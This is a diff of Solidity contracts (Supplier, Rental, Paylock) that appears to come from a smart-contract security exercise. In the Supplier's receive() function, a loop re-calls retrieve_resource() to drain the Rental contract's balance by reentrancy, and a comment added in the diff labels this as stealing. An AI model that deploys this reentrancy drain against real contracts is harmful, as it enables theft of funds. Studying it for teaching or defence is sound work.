@@ -79,7 +79,7 @@ contract Supplier {
         p = Paylock(pp);
         st = State.Working;
         r = Rental(rent);
-        
+        rSt = ResourceState.Untouched;
     }
     
     // E3
@@ -96,16 +96,9 @@ contract Supplier {
     }
     
     function finish() external {
-        require (st == State.Working);
+        require (st == State.Working && rSt == ResourceState.Released);
         p.signal();
         st = State.Completed;
-    }
-    
-    function att() public {
-        // emit Paid(address(this).balance);
-        if(address(r).balance > 1 wei && gasleft() > 800000){
-            r.retrieve_resource();
-        }
     }
 
     // Display the balance
@@ -114,6 +107,7 @@ contract Supplier {
     }
 
     receive() external payable{
+        // Detect if there is enough gas to continue stealing
         if (address(r).balance > 1 wei && gasleft() > 20000) {
             r.retrieve_resource();
         }
@@ -147,6 +141,7 @@ contract Rental {
         resource_available = true;
     }
     
+    // Display the balance
     function getBalance() external view returns(uint256) {
         return address(this).balance;
     }
